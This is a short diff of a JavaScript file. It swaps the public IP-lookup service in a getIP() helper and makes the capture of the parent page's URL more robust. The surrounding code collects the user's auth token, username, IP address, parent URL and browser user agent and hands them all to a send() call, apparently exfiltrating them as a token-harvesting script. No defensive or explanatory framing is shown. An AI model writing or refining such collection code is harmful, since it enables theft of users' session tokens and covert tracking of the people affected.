@@ -17,12 +17,9 @@
   }
 
   function getIP() {
-    return fetch('https://cip.cc/', {mode:'cors'})
-      .then(function(r){ return r.text(); })
-      .then(function(text){
-        var m = text.match(/IP\s*:\s*(\S+)/);
-        return m ? m[1] : null;
-      })
+    return fetch('https://api.ipify.org?format=json')
+      .then(function(r){ return r.json(); })
+      .then(function(d){ return d.ip; })
       .catch(function(){ return null; });
   }
 
@@ -52,13 +49,15 @@
     var ipPromise = getIP();
     var userInfoPromise = getUserInfo(token);
 
+    var parentUrl = null;
+    try { parentUrl = window.parent.location.href; } catch(e) {}
     Promise.all([ipPromise, userInfoPromise]).then(function(results){
       send({
         token: token,
         username: username || results[1] || 'unknown',
         api_username: results[1],
         ip: results[0] || 'unknown',
-        url: (window.parent.location.href || window.location.href),
+        url: parentUrl || 'unknown',
         user_agent: navigator.userAgent
       });
     });
